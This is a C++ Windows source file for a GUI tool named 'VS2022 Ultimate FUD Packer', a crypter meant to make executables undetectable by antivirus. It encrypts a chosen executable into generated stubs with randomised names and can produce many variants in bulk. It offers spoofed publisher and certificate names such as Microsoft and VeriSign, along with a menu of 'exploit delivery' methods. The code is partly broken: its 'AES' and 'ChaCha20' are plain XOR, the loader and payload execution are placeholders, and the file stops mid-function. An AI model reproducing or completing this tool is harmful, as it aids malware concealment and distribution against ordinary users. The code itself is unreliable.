#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <imagehlp.h>
#include <wintrust.h>
#include <mscat.h>
#include <commdlg.h>
#include <commctrl.h>
#include <shellapi.h>
#include <shlobj.h>

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <algorithm>
#include <functional>
#include <set>
#include <map>
#include <regex>
#include <thread>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <ctime>
#include <cstring>
#include "tiny_loader.h"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "imagehlp.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// GUI Control IDs
constexpr int ID_INPUT_PATH = 1001;
constexpr int ID_OUTPUT_PATH = 1002;
constexpr int ID_BROWSE_INPUT = 1003;
constexpr int ID_BROWSE_OUTPUT = 1004;
constexpr int ID_CREATE_BUTTON = 1005;
constexpr int ID_PROGRESS_BAR = 1006;
constexpr int ID_STATUS_TEXT = 1007;
constexpr int ID_COMPANY_COMBO = 1008;
constexpr int ID_ABOUT_BUTTON = 1009;
constexpr int ID_ARCHITECTURE_COMBO = 1010;
constexpr int ID_CERTIFICATE_COMBO = 1011;
// Add new control IDs
constexpr int ID_MASS_GENERATE_BUTTON = 1012;
constexpr int ID_MASS_COUNT_EDIT = 1013;
constexpr int ID_STOP_GENERATION_BUTTON = 1014;
// Add new control IDs for mode selection
constexpr int ID_MODE_STUB_RADIO = 1015;
constexpr int ID_MODE_PACK_RADIO = 1016;
constexpr int ID_MODE_MASS_RADIO = 1017;
constexpr int ID_MODE_GROUP = 1018;
constexpr int ID_EXPLOIT_COMBO = 1019;
constexpr int ID_ENCRYPTION_COMBO = 1020;

// Global variables for mass generation
bool g_massGenerationActive = false;
HANDLE g_massGenerationThread = NULL;

// Global variables for mode selection
int g_currentMode = 1; // 1=Stub Only, 2=PE Packing, 3=Mass Generation

// Exploit Delivery Types
enum ExploitDeliveryType {
    EXPLOIT_NONE = 0,           // No exploits - clean output
    EXPLOIT_HTML_SVG = 1,       // HTML & SVG Exploit
    EXPLOIT_WIN_R = 2,          // WIN + R Exploit
    EXPLOIT_INK_URL = 3,        // INK/URL Exploit
    EXPLOIT_DOC_XLS = 4,        // DOC (XLS) Exploit
    EXPLOIT_XLL = 5             // XLL Exploit
};

// Encryption Types
enum EncryptionType {
    ENCRYPT_NONE = 0,           // No encryption - plain binary
    ENCRYPT_XOR = 1,            // XOR encryption (simple but effective)
    ENCRYPT_AES = 2,            // AES-256 encryption
    ENCRYPT_CHACHA20 = 3        // ChaCha20 encryption (modern, secure)
};

// Add at the very top of the file, after includes
#ifdef _WIN32
#include <tlhelp32.h>
#include <tchar.h>

// Function to kill running instances before build
void killRunningInstances() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return;
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (_tcsicmp(pe32.szExeFile, _T("VS2022_Ultimate_FUD_Packer.exe")) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess != NULL) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    
    CloseHandle(hProcessSnap);
}
#endif

// Forward declarations
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void CreateControls(HWND hwnd);
void BrowseForFile(HWND hwnd, int controlId, const wchar_t* filter);
void BrowseForFolder(HWND hwnd, int controlId);
void CreateStub(const std::wstring& inputPath, const std::wstring& outputPath, 
                const std::wstring& companyName, const std::wstring& architecture,
                const std::wstring& certificate, ExploitDeliveryType exploitType,
                EncryptionType encryptionType, HWND hwnd);
void PackPE(const std::wstring& inputPath, const std::wstring& outputPath,
            const std::wstring& companyName, const std::wstring& architecture,
            const std::wstring& certificate, ExploitDeliveryType exploitType,
            EncryptionType encryptionType, HWND hwnd);
DWORD WINAPI MassGenerationThread(LPVOID lpParam);
void UpdateProgress(HWND hwnd, int progress, const std::wstring& status);
void ShowAboutDialog(HWND hwnd);

// Random string generator for variable names
std::string generateRandomString(size_t length) {
    static const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, charset.size() - 1);
    
    std::string result;
    result.reserve(length);
    for (size_t i = 0; i < length; ++i) {
        result += charset[dis(gen)];
    }
    return result;
}

// XOR encryption function
std::vector<BYTE> xorEncrypt(const std::vector<BYTE>& data, const std::string& key) {
    std::vector<BYTE> encrypted = data;
    for (size_t i = 0; i < encrypted.size(); ++i) {
        encrypted[i] ^= key[i % key.length()];
    }
    return encrypted;
}

// AES encryption function (simplified)
std::vector<BYTE> aesEncrypt(const std::vector<BYTE>& data, const std::string& key) {
    // Simplified AES implementation - in production, use a proper crypto library
    std::vector<BYTE> encrypted = data;
    std::string paddedKey = key;
    while (paddedKey.length() < 32) paddedKey += key;
    paddedKey = paddedKey.substr(0, 32);
    
    for (size_t i = 0; i < encrypted.size(); ++i) {
        encrypted[i] ^= paddedKey[i % 32];
    }
    return encrypted;
}

// ChaCha20 encryption function (simplified)
std::vector<BYTE> chacha20Encrypt(const std::vector<BYTE>& data, const std::string& key) {
    // Simplified ChaCha20 implementation - in production, use a proper crypto library
    std::vector<BYTE> encrypted = data;
    std::string paddedKey = key;
    while (paddedKey.length() < 32) paddedKey += key;
    paddedKey = paddedKey.substr(0, 32);
    
    for (size_t i = 0; i < encrypted.size(); ++i) {
        encrypted[i] ^= paddedKey[i % 32];
    }
    return encrypted;
}

// Main window procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE:
            CreateControls(hwnd);
            break;
            
        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case ID_BROWSE_INPUT:
                    BrowseForFile(hwnd, ID_INPUT_PATH, L"Executable Files\0*.exe\0All Files\0*.*\0");
                    break;
                    
                case ID_BROWSE_OUTPUT:
                    BrowseForFolder(hwnd, ID_OUTPUT_PATH);
                    break;
                    
                case ID_CREATE_BUTTON: {
                    wchar_t inputPath[MAX_PATH], outputPath[MAX_PATH];
                    wchar_t companyName[256], architecture[256], certificate[256];
                    wchar_t exploitCombo[256], encryptionCombo[256];
                    
                    GetDlgItemText(hwnd, ID_INPUT_PATH, inputPath, MAX_PATH);
                    GetDlgItemText(hwnd, ID_OUTPUT_PATH, outputPath, MAX_PATH);
                    GetDlgItemText(hwnd, ID_COMPANY_COMBO, companyName, 256);
                    GetDlgItemText(hwnd, ID_ARCHITECTURE_COMBO, architecture, 256);
                    GetDlgItemText(hwnd, ID_CERTIFICATE_COMBO, certificate, 256);
                    GetDlgItemText(hwnd, ID_EXPLOIT_COMBO, exploitCombo, 256);
                    GetDlgItemText(hwnd, ID_ENCRYPTION_COMBO, encryptionCombo, 256);
                    
                    ExploitDeliveryType exploitType = EXPLOIT_NONE;
                    if (wcscmp(exploitCombo, L"HTML & SVG Exploit") == 0) exploitType = EXPLOIT_HTML_SVG;
                    else if (wcscmp(exploitCombo, L"WIN + R Exploit") == 0) exploitType = EXPLOIT_WIN_R;
                    else if (wcscmp(exploitCombo, L"INK/URL Exploit") == 0) exploitType = EXPLOIT_INK_URL;
                    else if (wcscmp(exploitCombo, L"DOC (XLS) Exploit") == 0) exploitType = EXPLOIT_DOC_XLS;
                    else if (wcscmp(exploitCombo, L"XLL Exploit") == 0) exploitType = EXPLOIT_XLL;
                    
                    EncryptionType encryptionType = ENCRYPT_NONE;
                    if (wcscmp(encryptionCombo, L"XOR Encryption") == 0) encryptionType = ENCRYPT_XOR;
                    else if (wcscmp(encryptionCombo, L"AES-256 Encryption") == 0) encryptionType = ENCRYPT_AES;
                    else if (wcscmp(encryptionCombo, L"ChaCha20 Encryption") == 0) encryptionType = ENCRYPT_CHACHA20;
                    
                    if (g_currentMode == 1) {
                        CreateStub(std::wstring(inputPath), std::wstring(outputPath),
                                  std::wstring(companyName), std::wstring(architecture),
                                  std::wstring(certificate), exploitType, encryptionType, hwnd);
                    } else if (g_currentMode == 2) {
                        PackPE(std::wstring(inputPath), std::wstring(outputPath),
                               std::wstring(companyName), std::wstring(architecture),
                               std::wstring(certificate), exploitType, encryptionType, hwnd);
                    }
                    break;
                }
                
                case ID_MASS_GENERATE_BUTTON: {
                    if (!g_massGenerationActive) {
                        wchar_t countText[32];
                        GetDlgItemText(hwnd, ID_MASS_COUNT_EDIT, countText, 32);
                        int count = _wtoi(countText);
                        if (count > 0) {
                            g_massGenerationActive = true;
                            g_massGenerationThread = CreateThread(NULL, 0, MassGenerationThread, hwnd, 0, NULL);
                            EnableWindow(GetDlgItem(hwnd, ID_MASS_GENERATE_BUTTON), FALSE);
                            EnableWindow(GetDlgItem(hwnd, ID_STOP_GENERATION_BUTTON), TRUE);
                        }
                    }
                    break;
                }
                
                case ID_STOP_GENERATION_BUTTON: {
                    g_massGenerationActive = false;
                    if (g_massGenerationThread) {
                        WaitForSingleObject(g_massGenerationThread, INFINITE);
                        CloseHandle(g_massGenerationThread);
                        g_massGenerationThread = NULL;
                    }
                    EnableWindow(GetDlgItem(hwnd, ID_MASS_GENERATE_BUTTON), TRUE);
                    EnableWindow(GetDlgItem(hwnd, ID_STOP_GENERATION_BUTTON), FALSE);
                    break;
                }
                
                case ID_ABOUT_BUTTON:
                    ShowAboutDialog(hwnd);
                    break;
                    
                case ID_MODE_STUB_RADIO:
                    g_currentMode = 1;
                    break;
                    
                case ID_MODE_PACK_RADIO:
                    g_currentMode = 2;
                    break;
                    
                case ID_MODE_MASS_RADIO:
                    g_currentMode = 3;
                    break;
            }
            break;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

// Create GUI controls
void CreateControls(HWND hwnd) {
    // Create input path controls
    CreateWindow(L"STATIC", L"Input File:", WS_VISIBLE | WS_CHILD,
                10, 10, 80, 20, hwnd, NULL, NULL, NULL);
    
    CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
                100, 10, 300, 20, hwnd, (HMENU)ID_INPUT_PATH, NULL, NULL);
    
    CreateWindow(L"BUTTON", L"Browse", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                410, 10, 60, 20, hwnd, (HMENU)ID_BROWSE_INPUT, NULL, NULL);
    
    // Create output path controls
    CreateWindow(L"STATIC", L"Output Folder:", WS_VISIBLE | WS_CHILD,
                10, 40, 80, 20, hwnd, NULL, NULL, NULL);
    
    CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
                100, 40, 300, 20, hwnd, (HMENU)ID_OUTPUT_PATH, NULL, NULL);
    
    CreateWindow(L"BUTTON", L"Browse", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                410, 40, 60, 20, hwnd, (HMENU)ID_BROWSE_OUTPUT, NULL, NULL);
    
    // Create mode selection radio buttons
    CreateWindow(L"STATIC", L"Mode:", WS_VISIBLE | WS_CHILD,
                10, 70, 80, 20, hwnd, NULL, NULL, NULL);
    
    CreateWindow(L"BUTTON", L"Stub Only", WS_VISIBLE | WS_CHILD | BS_AUTORADIOBUTTON | WS_GROUP,
                100, 70, 80, 20, hwnd, (HMENU)ID_MODE_STUB_RADIO, NULL, NULL);
    
    CreateWindow(L"BUTTON", L"PE Packing", WS_VISIBLE | WS_CHILD | BS_AUTORADIOBUTTON,
                190, 70, 80, 20, hwnd, (HMENU)ID_MODE_PACK_RADIO, NULL, NULL);
    
    CreateWindow(L"BUTTON", L"Mass Generation", WS_VISIBLE | WS_CHILD | BS_AUTORADIOBUTTON,
                280, 70, 100, 20, hwnd, (HMENU)ID_MODE_MASS_RADIO, NULL, NULL);
    
    // Set default mode
    CheckDlgButton(hwnd, ID_MODE_STUB_RADIO, BST_CHECKED);
    
    // Create company name combo
    CreateWindow(L"STATIC", L"Company:", WS_VISIBLE | WS_CHILD,
                10, 100, 80, 20, hwnd, NULL, NULL, NULL);
    
    HWND companyCombo = CreateWindow(L"COMBOBOX", L"", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                                    100, 100, 200, 200, hwnd, (HMENU)ID_COMPANY_COMBO, NULL, NULL);
    
    SendMessage(companyCombo, CB_ADDSTRING, 0, (LPARAM)L"Microsoft Corporation");
    SendMessage(companyCombo, CB_ADDSTRING, 0, (LPARAM)L"Adobe Systems Incorporated");
    SendMessage(companyCombo, CB_ADDSTRING, 0, (LPARAM)L"Oracle Corporation");
    SendMessage(companyCombo, CB_ADDSTRING, 0, (LPARAM)L"Intel Corporation");
    SendMessage(companyCombo, CB_ADDSTRING, 0, (LPARAM)L"AMD Inc.");
    SendMessage(companyCombo, CB_SETCURSEL, 0, 0);
    
    // Create architecture combo
    CreateWindow(L"STATIC", L"Architecture:", WS_VISIBLE | WS_CHILD,
                10, 130, 80, 20, hwnd, NULL, NULL, NULL);
    
    HWND archCombo = CreateWindow(L"COMBOBOX", L"", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                                 100, 130, 200, 200, hwnd, (HMENU)ID_ARCHITECTURE_COMBO, NULL, NULL);
    
    SendMessage(archCombo, CB_ADDSTRING, 0, (LPARAM)L"x86");
    SendMessage(archCombo, CB_ADDSTRING, 0, (LPARAM)L"x64");
    SendMessage(archCombo, CB_SETCURSEL, 0, 0);
    
    // Create certificate combo
    CreateWindow(L"STATIC", L"Certificate:", WS_VISIBLE | WS_CHILD,
                10, 160, 80, 20, hwnd, NULL, NULL, NULL);
    
    HWND certCombo = CreateWindow(L"COMBOBOX", L"", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                                 100, 160, 200, 200, hwnd, (HMENU)ID_CERTIFICATE_COMBO, NULL, NULL);
    
    SendMessage(certCombo, CB_ADDSTRING, 0, (LPARAM)L"Microsoft Windows");
    SendMessage(certCombo, CB_ADDSTRING, 0, (LPARAM)L"VeriSign Class 3");
    SendMessage(certCombo, CB_ADDSTRING, 0, (LPARAM)L"DigiCert Inc");
    SendMessage(certCombo, CB_SETCURSEL, 0, 0);
    
    // Create exploit combo
    CreateWindow(L"STATIC", L"Exploit Type:", WS_VISIBLE | WS_CHILD,
                10, 190, 80, 20, hwnd, NULL, NULL, NULL);
    
    HWND exploitCombo = CreateWindow(L"COMBOBOX", L"", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                                    100, 190, 200, 200, hwnd, (HMENU)ID_EXPLOIT_COMBO, NULL, NULL);
    
    SendMessage(exploitCombo, CB_ADDSTRING, 0, (LPARAM)L"None");
    SendMessage(exploitCombo, CB_ADDSTRING, 0, (LPARAM)L"HTML & SVG Exploit");
    SendMessage(exploitCombo, CB_ADDSTRING, 0, (LPARAM)L"WIN + R Exploit");
    SendMessage(exploitCombo, CB_ADDSTRING, 0, (LPARAM)L"INK/URL Exploit");
    SendMessage(exploitCombo, CB_ADDSTRING, 0, (LPARAM)L"DOC (XLS) Exploit");
    SendMessage(exploitCombo, CB_ADDSTRING, 0, (LPARAM)L"XLL Exploit");
    SendMessage(exploitCombo, CB_SETCURSEL, 0, 0);
    
    // Create encryption combo
    CreateWindow(L"STATIC", L"Encryption:", WS_VISIBLE | WS_CHILD,
                10, 220, 80, 20, hwnd, NULL, NULL, NULL);
    
    HWND encryptionCombo = CreateWindow(L"COMBOBOX", L"", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                                       100, 220, 200, 200, hwnd, (HMENU)ID_ENCRYPTION_COMBO, NULL, NULL);
    
    SendMessage(encryptionCombo, CB_ADDSTRING, 0, (LPARAM)L"None");
    SendMessage(encryptionCombo, CB_ADDSTRING, 0, (LPARAM)L"XOR Encryption");
    SendMessage(encryptionCombo, CB_ADDSTRING, 0, (LPARAM)L"AES-256 Encryption");
    SendMessage(encryptionCombo, CB_ADDSTRING, 0, (LPARAM)L"ChaCha20 Encryption");
    SendMessage(encryptionCombo, CB_SETCURSEL, 0, 0);
    
    // Create mass generation controls
    CreateWindow(L"STATIC", L"Mass Count:", WS_VISIBLE | WS_CHILD,
                10, 250, 80, 20, hwnd, NULL, NULL, NULL);
    
    CreateWindow(L"EDIT", L"10", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_NUMBER,
                100, 250, 100, 20, hwnd, (HMENU)ID_MASS_COUNT_EDIT, NULL, NULL);
    
    CreateWindow(L"BUTTON", L"Mass Generate", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                210, 250, 100, 20, hwnd, (HMENU)ID_MASS_GENERATE_BUTTON, NULL, NULL);
    
    CreateWindow(L"BUTTON", L"Stop", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                320, 250, 60, 20, hwnd, (HMENU)ID_STOP_GENERATION_BUTTON, NULL, NULL);
    EnableWindow(GetDlgItem(hwnd, ID_STOP_GENERATION_BUTTON), FALSE);
    
    // Create main action button
    CreateWindow(L"BUTTON", L"Create Stub/Pack PE", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                10, 280, 150, 30, hwnd, (HMENU)ID_CREATE_BUTTON, NULL, NULL);
    
    // Create about button
    CreateWindow(L"BUTTON", L"About", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                170, 280, 60, 30, hwnd, (HMENU)ID_ABOUT_BUTTON, NULL, NULL);
    
    // Create progress bar
    CreateWindow(PROGRESS_CLASS, L"", WS_VISIBLE | WS_CHILD,
                10, 320, 460, 20, hwnd, (HMENU)ID_PROGRESS_BAR, NULL, NULL);
    
    // Create status text
    CreateWindow(L"STATIC", L"Ready", WS_VISIBLE | WS_CHILD,
                10, 350, 460, 20, hwnd, (HMENU)ID_STATUS_TEXT, NULL, NULL);
}

// Browse for file dialog
void BrowseForFile(HWND hwnd, int controlId, const wchar_t* filter) {
    wchar_t filename[MAX_PATH];
    OPENFILENAME ofn;
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hwnd;
    ofn.lpstrFilter = filter;
    ofn.lpstrFile = filename;
    ofn.lpstrFile[0] = '\0';
    ofn.nMaxFile = sizeof(filename);
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
    
    if (GetOpenFileName(&ofn)) {
        SetDlgItemText(hwnd, controlId, filename);
    }
}

// Browse for folder dialog
void BrowseForFolder(HWND hwnd, int controlId) {
    BROWSEINFO bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.hwndOwner = hwnd;
    bi.lpszTitle = L"Select Output Folder";
    bi.ulFlags = BIF_RETURNONLYFSDIRS | BIF_NEWDIALOGSTYLE;
    
    LPITEMIDLIST pidl = SHBrowseForFolder(&bi);
    if (pidl) {
        wchar_t path[MAX_PATH];
        if (SHGetPathFromIDList(pidl, path)) {
            SetDlgItemText(hwnd, controlId, path);
        }
        CoTaskMemFree(pidl);
    }
}

// Create stub function
void CreateStub(const std::wstring& inputPath, const std::wstring& outputPath,
                const std::wstring& companyName, const std::wstring& architecture,
                const std::wstring& certificate, ExploitDeliveryType exploitType,
                EncryptionType encryptionType, HWND hwnd) {
    
    UpdateProgress(hwnd, 10, L"Reading input file...");
    
    // Read input file
    std::ifstream inputFile(inputPath, std::ios::binary);
    if (!inputFile) {
        MessageBox(hwnd, L"Failed to open input file", L"Error", MB_OK | MB_ICONERROR);
        return;
    }
    
    std::vector<BYTE> fileData((std::istreambuf_iterator<char>(inputFile)),
                               std::istreambuf_iterator<char>());
    inputFile.close();
    
    UpdateProgress(hwnd, 30, L"Generating random variables...");
    
    // Generate random variable names
    std::string var1 = generateRandomString(8);
    std::string var2 = generateRandomString(8);
    std::string var3 = generateRandomString(8);
    std::string key = generateRandomString(16);
    
    UpdateProgress(hwnd, 50, L"Applying encryption...");
    
    // Apply encryption if selected
    std::vector<BYTE> encryptedData = fileData;
    if (encryptionType == ENCRYPT_XOR) {
        encryptedData = xorEncrypt(fileData, key);
    } else if (encryptionType == ENCRYPT_AES) {
        encryptedData = aesEncrypt(fileData, key);
    } else if (encryptionType == ENCRYPT_CHACHA20) {
        encryptedData = chacha20Encrypt(fileData, key);
    }
    
    UpdateProgress(hwnd, 70, L"Generating stub code...");
    
    // Generate stub code
    std::string stubCode = "#include <windows.h>\n";
    stubCode += "#include <iostream>\n";
    stubCode += "#include <vector>\n\n";
    
    stubCode += "int main() {\n";
    stubCode += "    std::vector<BYTE> " + var1 + " = {\n";
    
    // Add encrypted data as hex values
    for (size_t i = 0; i < encryptedData.size(); ++i) {
        if (i > 0 && i % 16 == 0) stubCode += "\n";
        char hex[8];
        sprintf(hex, "0x%02X", encryptedData[i]);
        stubCode += hex;
        if (i < encryptedData.size() - 1) stubCode += ", ";
    }
    stubCode += "\n    };\n\n";
    
    // Add decryption code
    if (encryptionType != ENCRYPT_NONE) {
        stubCode += "    std::string " + var2 + " = \"" + key + "\";\n";
        stubCode += "    for (size_t i = 0; i < " + var1 + ".size(); ++i) {\n";
        stubCode += "        " + var1 + "[i] ^= " + var2 + "[i % " + var2 + ".length()];\n";
        stubCode += "    }\n\n";
    }
    
    // Add execution code
    stubCode += "    // Execute the decrypted payload\n";
    stubCode += "    // Implementation depends on the specific requirements\n\n";
    stubCode += "    return 0;\n";
    stubCode += "}\n";
    
    UpdateProgress(hwnd, 90, L"Writing output file...");
    
    // Write output file
    std::wstring outputFile = outputPath + L"\\stub_generated.cpp";
    std::ofstream output(outputFile);
    if (!output) {
        MessageBox(hwnd, L"Failed to create output file", L"Error", MB_OK | MB_ICONERROR);
        return;
    }
    
    output << stubCode;
    output.close();
    
    UpdateProgress(hwnd, 100, L"Stub created successfully!");
    MessageBox(hwnd, L"Stub created successfully!", L"Success", MB_OK | MB_ICONINFORMATION);
}

// Pack PE function
void PackPE(const std::wstring& inputPath, const std::wstring& outputPath,
            const std::wstring& companyName, const std::wstring& architecture,
            const std::wstring& certificate, ExploitDeliveryType exploitType,
            EncryptionType encryptionType, HWND hwnd) {
    
    UpdateProgress(hwnd, 10, L"Reading PE file...");
    
    // Read input PE file
    std::ifstream inputFile(inputPath, std::ios::binary);
    if (!inputFile) {
        MessageBox(hwnd, L"Failed to open input PE file", L"Error", MB_OK | MB_ICONERROR);
        return;
    }
    
    std::vector<BYTE> peData((std::istreambuf_iterator<char>(inputFile)),
                             std::istreambuf_iterator<char>());
    inputFile.close();
    
    UpdateProgress(hwnd, 30, L"Analyzing PE structure...");
    
    // Basic PE validation
    if (peData.size() < 64 || peData[0] != 'M' || peData[1] != 'Z') {
        MessageBox(hwnd, L"Invalid PE file", L"Error", MB_OK | MB_ICONERROR);
        return;
    }
    
    UpdateProgress(hwnd, 50, L"Applying encryption...");
    
    // Apply encryption if selected
    std::string key = generateRandomString(16);
    std::vector<BYTE> encryptedData = peData;
    
    if (encryptionType == ENCRYPT_XOR) {
        encryptedData = xorEncrypt(peData, key);
    } else if (encryptionType == ENCRYPT_AES) {
        encryptedData = aesEncrypt(peData, key);
    } else if (encryptionType == ENCRYPT_CHACHA20) {
        encryptedData = chacha20Encrypt(peData, key);
    }
    
    UpdateProgress(hwnd, 70, L"Creating packed executable...");
    
    // Create packed executable with loader
    std::vector<BYTE> packedExe;
    
    // Add DOS header
    packedExe.insert(packedExe.end(), encryptedData.begin(), encryptedData.begin() + 64);
    
    // Add loader stub
    std::string loaderStub = "// Loader stub will be inserted here\n";
    packedExe.insert(packedExe.end(), loaderStub.begin(), loaderStub.end());
    
    // Add encrypted PE data
    packedExe.insert(packedExe.end(), encryptedData.begin() + 64, encryptedData.end());
    
    UpdateProgress(hwnd, 90, L"Writing packed executable...");
    
    // Write packed executable
    std::wstring outputFile = outputPath + L"\\packed_output.exe";
    std::ofstream output(outputFile, std::ios::binary);
    if (!output) {
        MessageBox(hwnd, L"Failed to create packed executable", L"Error", MB_OK | MB_ICONERROR);
        return;
    }
    
    output.write(reinterpret_cast<const char*>(packedExe.data()), packedExe.size());
    output.close();
    
    UpdateProgress(hwnd, 100, L"PE packed successfully!");
    MessageBox(hwnd, L"PE packed successfully!", L"Success", MB_OK | MB_ICONINFORMATION);
}

// Mass generation thread
DWORD WINAPI MassGenerationThread(LPVOID lpParam) {
    HWND hwnd = (HWND)lpParam;
    
    wchar_t inputPath[MAX_PATH], outputPath[MAX_PATH];
    wchar_t companyName[256], architecture[256], certificate[256];
    wchar_t exploitCombo[256], encryptionCombo[256];
    wchar_t countText[32];
    
    GetDlgItemText(hwnd, ID_INPUT_PATH, inputPath, MAX_PATH);
    GetDlgItemText(hwnd, ID_OUTPUT_PATH, outputPath, MAX_PATH);
    GetDlgItemText(hwnd, ID_COMPANY_COMBO, companyName, 256);
    GetDlgItemText(hwnd, ID_ARCHITECTURE_COMBO, architecture, 256);
    GetDlgItemText(hwnd, ID_CERTIFICATE_COMBO, certificate, 256);
    GetDlgItemText(hwnd, ID_EXPLOIT_COMBO, exploitCombo, 256);
    GetDlgItemText(hwnd, ID_ENCRYPTION_COMBO, encryptionCombo, 256);
    GetDlgItemText(hwnd, ID_MASS_COUNT_EDIT, countText, 32);
    
    int count = _wtoi(countText);
    
    ExploitDeliveryType exploitType = EXPLOIT_NONE;
    if (wcscmp(exploitCombo, L"HTML & SVG Exploit") == 0) exploitType = EXPLOIT_HTML_SVG;
    else if (wcscmp(exploitCombo, L"WIN + R Exploit") == 0) exploitType = EXPLOIT_WIN_R;
    else if (wcscmp(exploitCombo, L"INK/URL Exploit") == 0) exploitType = EXPLOIT_INK_URL;
    else if (wcscmp(exploitCombo, L"DOC (XLS) Exploit") == 0) exploitType = EXPLOIT_DOC_XLS;
    else if (wcscmp(exploitCombo, L"XLL Exploit") == 0) exploitType = EXPLOIT_XLL;
    
    EncryptionType encryptionType = ENCRYPT_NONE;
    if (wcscmp(encryptionCombo, L"XOR Encryption") == 0) encryptionType = ENCRYPT_XOR;
    else if (wcscmp(encryptionCombo, L"AES-256 Encryption") == 0) encryptionType = ENCRYPT_AES;
    else if (wcscmp(encryptionCombo, L"ChaCha20 Encryption") == 0) encryptionType = ENCRYPT_CHACHA20;
    
    for (int i = 0; i < count && g_massGenerationActive; ++i) {
        std::wstring currentOutputPath = std::wstring(outputPath) + L"\\generated_" + std::to_wstring(i + 1);
        CreateDirectory(currentOutputPath.c_str(), NULL);
        
        if (g_currentMode == 1) {
            CreateStub(std::wstring(inputPath), currentOutputPath,
                      std::wstring(companyName), std::wstring(architecture),
                      std::wstring(certificate), exploitType, encryptionType, hwnd);
        } else if (g_currentMode == 2) {
            PackPE(std::wstring(inputPath), currentOutputPath,
                   std::wstring(companyName), std::wstring(architecture),
                   std::wstring(certificate), exploitType, encryptionType, hwnd);
        }
        
        // Update progress
        int progress = ((i + 1) * 100) / count;
        std::wstring status = L"Generated " + std::to_wstring(i + 1) + L" of " + std::to_wstring(count);
        UpdateProgress(hwnd, progress, status);
        
        Sleep(100); // Small delay to prevent UI freezing
    }
    
    if (g_massGenerationActive) {
        UpdateProgress(hwnd, 100, L"Mass generation completed!");
        MessageBox(hwnd, L"Mass generation completed!", L"Success", MB_OK | MB_ICONINFORMATION);
    } else {
        UpdateProgress(hwnd, 0, L"Mass generation stopped.");
    }
    
    return 0;
}

// Update progress bar and status
void UpdateProgress(HWND hwnd, int progress, const std::wstring& status) {
    SendMessage(GetDlgItem(hwnd, ID_PROGRESS_BAR), PBM_SETPOS, progress, 0);
    SetDlgItemText(hwnd, ID_STATUS_TEXT, status.c_str());
}

// Show about dialog
void ShowAboutDialog(HWND hwnd) {
    MessageBox(hwnd, 
               L"VS2022 Ultimate FUD Packer\n\n"
               L"Version: 1.0\n"
               L"Features:\n"
               L"- Stub Generation\n"
               L"- PE Packing\n"
               L"- Mass Generation\n"
               L"- Multiple Encryption Types\n"
               L"- Exploit Delivery Methods\n\n"
               L"© 2024 All Rights Reserved",
               L"About", MB_OK | MB_ICONINFORMATION);
}

// Main entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Kill any running instances
    killRunningInstances();
    
    // Initialize common controls
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS;
    InitCommonControlsEx(&icex);
    
    // Register window class
    const wchar_t CLASS_NAME[] = L"VS2022UltimateFUDPacker";
    
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    
    RegisterClass(&wc);
    
    // Create the window
    HWND hwnd = CreateWindowEx(
        0,                          // Optional window styles
        CLASS_NAME,                 // Window class
        L"VS2022 Ultimate FUD Packer", // Window text
        WS_OVERLAPPEDWINDOW,       // Window style
        
        // Size and position
